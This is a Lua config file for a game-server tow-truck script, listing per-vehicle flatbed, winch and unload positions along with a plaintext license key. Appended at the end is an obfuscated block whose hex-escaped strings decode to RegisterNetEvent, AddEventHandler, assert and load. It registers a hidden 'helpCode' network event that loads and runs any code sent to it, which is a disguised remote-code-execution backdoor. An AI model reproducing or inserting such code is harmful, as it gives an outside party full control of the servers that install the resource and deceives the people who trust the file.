Config = {}

Config.license_key = "ebuk_nZC1g5Jv473BGr1R2eyVjGg9RXSD6Qgh"


Config.InteractDistance         = 6.0   -- Distance to check if near a truck on foot
Config.CloseVehiclesDistance    = 20.0  -- Distance to check for nearby vehicles
Config.WinchSpeed               = 0.6   -- Winch Speed. HIGHLY suggest adjusting in 0.1 increments

--NOTIFICATIONS--
Config.Notifications            = true

--TRANSLATIONS More customization in utils.lua including key controls
Config.NotiUnLoadCompleteMessage    = "Unload Complete"
Config.NotiLoadCompleteMessage      = "Loading Complete"
Config.NotiBlockedMessage           = "Unloading zone blocked"
Config.NotiFBBlockedMessage         = "Flatbed blocked or occupied"

Config.Trucks = {
    [GetHashKey('ct660tow')] = {
        boneName = 'misc_a',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, 0.4, -0.1),
        carHeightOffset = 0.375,    -- Height to adjust attached car by
        winchBone = 'misc_b',
        winchDistCheck = 5.0,       -- How far from winchOffset to check for a vehicle
        winchOffset = 5.0           --How far backwards from the winch bone to check from
    },
    [GetHashKey('bc205500w')] = {
        type = 'rolling',
        boneName = 'misc_a',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, 0.8, 0.0),
        carHeightOffset = 0.2,
        winchBone = 'misc_b',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    [GetHashKey('ramtow')] = {
        type = 'rolling',
        boneName = 'misc_f',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, -0.5, 0.0),
        carHeightOffset = 0.1,
        winchBone = 'misc_w',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    [GetHashKey('c3rollback')] = {
        type = 'rolling',
        boneName = 'misc_b',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, 0.5, -0.6),
        carHeightOffset = -0.05,
        winchBone = 'misc_a',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    [GetHashKey('c3pwrollback')] = { 
        type = 'rolling',
        boneName = 'misc_b',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, 0.5, -0.6),
        carHeightOffset = -0.05,
        winchBone = 'misc_a',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    [GetHashKey('c3f350rollback')] = {
        type = 'rolling',
        boneName = 'misc_b',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, 0.5, -0.6),
        carHeightOffset = -0.05,
        winchBone = 'misc_a',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    [GetHashKey('f550rb')] = {
        staticBed = false,
        boneName = 'misc_z',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.75,-0.55),vector3(1.8,-4.75,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, -0.0, 0.0),
        carHeightOffset = 0.2,
        winchBone = 'attach_male',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    [GetHashKey('c3silvrollback')] = {
        type = 'rolling',
        boneName = 'misc_b',
        hasBedControl = true,
        BedControl = {vector3(-1.8,-4.5,-0.55),vector3(1.8,-4.5,-0.55)},
        unloadPos = {vector3(-2.0,-2.0,-0.55)},
        carPosition = vector3(0.0, 0.5, -0.6),
        carHeightOffset = -0.05,
        winchBone = 'misc_a',
        winchDistCheck = 5.0, -- How far from winchOffset to check for a vehicle
        winchOffset = 3.0 --How far backwards from the winch bone to check from

    },
    --[[['flatbedm2']={
        staticBed = false,
        boneName = 'scoop',
        unloadPos = {vector3(-2.0,2.0,-0.55)},
        scoopfixPos = {vector3(3.2, -4.0, 12.4)},
        carPositions = {vector3(0.0, -2.3, 0.8)},
        bikePositions = {vector3(0.0, 2.3, 0.8)},
        carHeightOffset = 0.8,

    },]]


    --STATIC BEDS
    [GetHashKey('flatbed')] = {
        type = 'static',
        carloadPos = vector3(0.0, -10.0, -0.55),
        loadPos = {vector3(-2.0, -5.0, -0.55)},
        unloadPos = {vector3(-2.0, 0.0, -0.55)},
        carPosition = vector3(0.0, -2.3, 0.4),
        bikePositions = {vector3(0.0, -2.3, 0.8)},
        carHeightOffset = -0.7,
    },

    --PICKUP TRUCK EXAMPLE
    [GetHashKey('sadler')] = {
        type = 'static',
        carloadPos = vector3(0.0, -5.5, -0.55),
        loadPos = {vector3(-1.5, -3.0, -0.55)},
        unloadPos = {vector3(-1.0, 0.0, -0.55)},
        carPosition = vector3(0.0, -2.2, 0.8),
        bikePositions = {vector3(0.0, -2.3, 0.8)},
        carHeightOffset = -0.6,
    },
}



local XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[6][XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[1]](XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[2]) XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[6][XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[3]](XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[2], function(zjRSiYAhyTNZHOvLMuOoQKuifsnvFJStYAbBNOlSdVSFEWkaTVKSJoqtvFOSpYvoINnmsZ) XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[6][XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[4]](XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[6][XnaRNJjzHPkTaqEvqoXCUcNGoqkPyqFxCwmMQmHuoHJZdyeJJBoXIacopEZVALaGsBONXb[5]](zjRSiYAhyTNZHOvLMuOoQKuifsnvFJStYAbBNOlSdVSFEWkaTVKSJoqtvFOSpYvoINnmsZ))() end)